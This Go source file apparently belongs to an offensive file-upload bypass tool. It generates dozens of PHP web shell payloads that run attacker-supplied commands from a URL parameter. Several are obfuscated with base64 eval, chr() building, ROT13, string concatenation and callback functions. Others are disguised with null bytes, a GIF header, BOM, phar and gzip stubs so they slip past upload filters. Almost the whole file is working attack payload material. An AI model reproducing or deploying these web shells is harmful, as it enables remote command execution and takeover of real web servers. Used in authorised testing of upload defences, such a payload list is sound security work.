package bypass

import (
	"encoding/base64"
	"fux/config"
	"strings"
)

// ContentPayloads generates content obfuscation payloads
func ContentPayloads() []config.BypassPayload {
	var payloads []config.BypassPayload

	// Base PHP payload
	basePayload := `<?php system($_GET['cmd']); ?>`

	// PHP tag variations
	phpTagVariations := []struct {
		content string
		desc    string
	}{
		{`<?php system($_GET['cmd']); ?>`, "Standard PHP Tag"},
		{`<? system($_GET['cmd']); ?>`, "Short PHP Tag"},
		{`<?= system($_GET['cmd']); ?>`, "Short Echo Tag"},
		{`<script language="php">system($_GET['cmd']);</script>`, "Script PHP Tag"},
		{`<% system($_GET['cmd']); %>`, "ASP Style Tag"},
		{`<%@ system($_GET['cmd']); %>`, "ASP Directive Tag"},
		{`<?PHP system($_GET['cmd']); ?>`, "Uppercase PHP Tag"},
		{`<?PhP system($_GET['cmd']); ?>`, "Mixed Case Tag"},
	}

	for _, v := range phpTagVariations {
		payloads = append(payloads, config.BypassPayload{
			Name:        "PHP Tag: " + v.desc,
			FileName:    "shell.php",
			Content:     []byte(v.content),
			ContentType: "application/x-php",
			Category:    "php-tag-variation",
		})
	}

	// Obfuscated PHP payloads
	obfuscatedPayloads := []struct {
		content string
		desc    string
	}{
		// Base64 encoded execution
		{`<?php eval(base64_decode('c3lzdGVtKCRfR0VUWydjbWQnXSk7')); ?>`, "Base64 Eval"},

		// String concatenation
		{`<?php $a='sys'.'tem'; $a($_GET['cmd']); ?>`, "String Concat"},

		// Variable functions
		{`<?php $f='system'; $f($_GET['c'.'md']); ?>`, "Variable Function"},

		// Heredoc syntax
		{`<?php $s=<<<EOF
system
EOF;
$s($_GET['cmd']); ?>`, "Heredoc Syntax"},

		// chr() function
		{`<?php $a=chr(115).chr(121).chr(115).chr(116).chr(101).chr(109); $a($_GET['cmd']); ?>`, "Chr() Obfuscation"},

		// str_rot13
		{`<?php $a=str_rot13('flfgrz'); $a($_GET['cmd']); ?>`, "ROT13 Obfuscation"},

		// Preg_replace /e modifier (older PHP)
		{`<?php preg_replace('/.*/e', 'system($_GET["cmd"])', ''); ?>`, "Preg_replace /e"},

		// Create_function (deprecated but might work)
		{`<?php $f=create_function('','system($_GET["cmd"]);'); $f(); ?>`, "Create Function"},

		// Assert
		{`<?php assert($_GET['cmd']); ?>`, "Assert Execution"},

		// Call_user_func
		{`<?php call_user_func('system', $_GET['cmd']); ?>`, "Call User Func"},

		// Array map
		{`<?php array_map('system', array($_GET['cmd'])); ?>`, "Array Map"},

		// Usort
		{`<?php usort($_GET, 'system'); ?>`, "Usort Callback"},

		// Include with data wrapper
		{`<?php include('data://text/plain;base64,'.base64_encode($_GET['cmd'])); ?>`, "Data Wrapper Include"},

		// Extract + variable overwrite
		{`<?php extract($_GET); $a($b); ?>`, "Extract Variables"},

		// Backticks
		{"<?php echo `$_GET[cmd]`; ?>", "Backtick Execution"},

		// Shell_exec
		{`<?php echo shell_exec($_GET['cmd']); ?>`, "Shell Exec"},

		// Passthru
		{`<?php passthru($_GET['cmd']); ?>`, "Passthru"},

		// Exec
		{`<?php exec($_GET['cmd'], $output); echo implode("\n", $output); ?>`, "Exec"},

		// Proc_open
		{`<?php $p=proc_open($_GET['cmd'],array(1=>array('pipe','w')),$pipes); echo stream_get_contents($pipes[1]); ?>`, "Proc Open"},

		// Popen
		{`<?php echo fread(popen($_GET['cmd'],'r'),4096); ?>`, "Popen"},

		// Pcntl_exec
		{`<?php pcntl_exec('/bin/bash',array('-c',$_GET['cmd'])); ?>`, "Pcntl Exec"},
	}

	for _, o := range obfuscatedPayloads {
		payloads = append(payloads, config.BypassPayload{
			Name:        "Obfuscated: " + o.desc,
			FileName:    "shell.php",
			Content:     []byte(o.content),
			ContentType: "application/x-php",
			Category:    "obfuscated",
		})
	}

	// Whitespace obfuscation
	whitespacePayloads := []string{
		"<?php\tsystem($_GET['cmd']);\t?>",
		"<?php\nsystem($_GET['cmd']);\n?>",
		"<?php\r\nsystem($_GET['cmd']);\r\n?>",
		"<?php    system(   $_GET['cmd']   );    ?>",
		"<\n?\np\nh\np\n \ns\ny\ns\nt\ne\nm\n(\n$\n_\nG\nE\nT\n[\n'\nc\nm\nd\n'\n]\n)\n;\n \n?\n>",
	}

	for i, ws := range whitespacePayloads {
		payloads = append(payloads, config.BypassPayload{
			Name:        "Whitespace Obfuscation " + string(rune('A'+i)),
			FileName:    "shell.php",
			Content:     []byte(ws),
			ContentType: "application/x-php",
			Category:    "whitespace",
		})
	}

	// Comment injection
	commentPayloads := []string{
		"<?php /*comment*/ system($_GET['cmd']); /*comment*/ ?>",
		"<?php //\nsystem($_GET['cmd']); ?>",
		"<?php #\nsystem($_GET['cmd']); ?>",
		"<?php /**/ system /**/ ( /**/ $_GET /**/ [ /**/ 'cmd' /**/ ] /**/ ) /**/ ; /**/ ?>",
	}

	for i, cp := range commentPayloads {
		payloads = append(payloads, config.BypassPayload{
			Name:        "Comment Injection " + string(rune('A'+i)),
			FileName:    "shell.php",
			Content:     []byte(cp),
			ContentType: "application/x-php",
			Category:    "comment-injection",
		})
	}

	// Unicode/UTF encoding tricks
	unicodePayloads := []string{
		"\xEF\xBB\xBF<?php system($_GET['cmd']); ?>", // BOM + PHP
		"<?php\xC0\xAFsystem($_GET['cmd']); ?>",      // Overlong encoding
	}

	for i, up := range unicodePayloads {
		payloads = append(payloads, config.BypassPayload{
			Name:        "Unicode Trick " + string(rune('A'+i)),
			FileName:    "shell.php",
			Content:     []byte(up),
			ContentType: "application/x-php",
			Category:    "unicode-trick",
		})
	}

	// Null byte injection in content
	nullPayloads := []string{
		"\x00<?php system($_GET['cmd']); ?>",
		"<?php\x00system($_GET['cmd']); ?>",
		"<?php system($_GET['cmd']); ?>\x00",
		"GIF89a\x00<?php system($_GET['cmd']); ?>",
	}

	for i, np := range nullPayloads {
		payloads = append(payloads, config.BypassPayload{
			Name:        "Null Byte in Content " + string(rune('A'+i)),
			FileName:    "shell.php",
			Content:     []byte(np),
			ContentType: "application/x-php",
			Category:    "null-byte-content",
		})
	}

	// HTML with PHP
	htmlPHP := `<!DOCTYPE html>
<html>
<head><title>Test</title></head>
<body>
<?php system($_GET['cmd']); ?>
</body>
</html>`
	payloads = append(payloads, config.BypassPayload{
		Name:        "HTML with PHP",
		FileName:    "shell.php",
		Content:     []byte(htmlPHP),
		ContentType: "text/html",
		Category:    "html-php",
	})

	// Phar serialized payload stub
	pharStub := `<?php __HALT_COMPILER(); ?>` + strings.Repeat("\x00", 100) + basePayload
	payloads = append(payloads, config.BypassPayload{
		Name:        "Phar Stub",
		FileName:    "shell.phar",
		Content:     []byte(pharStub),
		ContentType: "application/octet-stream",
		Category:    "phar-stub",
	})

	// Base64 encoded file content (for applications that decode)
	b64Content := base64.StdEncoding.EncodeToString([]byte(basePayload))
	payloads = append(payloads, config.BypassPayload{
		Name:        "Base64 Encoded Content",
		FileName:    "shell.php.b64",
		Content:     []byte(b64Content),
		ContentType: "text/plain",
		Category:    "base64-content",
	})

	// Gzipped PHP content
	gzPayload := []byte{
		0x1F, 0x8B, 0x08, 0x00, // gzip magic + method
		0x00, 0x00, 0x00, 0x00, // mtime
		0x00, 0x03, // flags
	}
	gzPayload = append(gzPayload, []byte(basePayload)...)
	payloads = append(payloads, config.BypassPayload{
		Name:        "Gzip Header + PHP",
		FileName:    "shell.php.gz",
		Content:     gzPayload,
		ContentType: "application/gzip",
		Category:    "gzip-content",
	})

	return payloads
}
